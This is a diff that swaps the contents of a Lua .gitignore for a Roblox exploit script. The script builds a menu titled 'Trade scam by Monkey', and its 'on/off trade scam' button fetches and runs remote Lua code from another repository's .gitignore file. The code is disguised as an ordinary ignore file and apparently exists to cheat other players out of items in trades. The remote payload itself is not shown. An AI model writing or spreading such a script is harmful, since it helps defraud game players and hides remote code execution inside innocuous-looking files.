@@ -1,41 +1,11 @@
-# Compiled Lua sources
-luac.out
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade scam by Monkey", "Ocean")
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
+--Main
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Main")
 
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
 
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+MainSection:NewButton("on/off trade scam", "trade scam", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/25kTsa/test1/main/.gitignore"))()
+end)
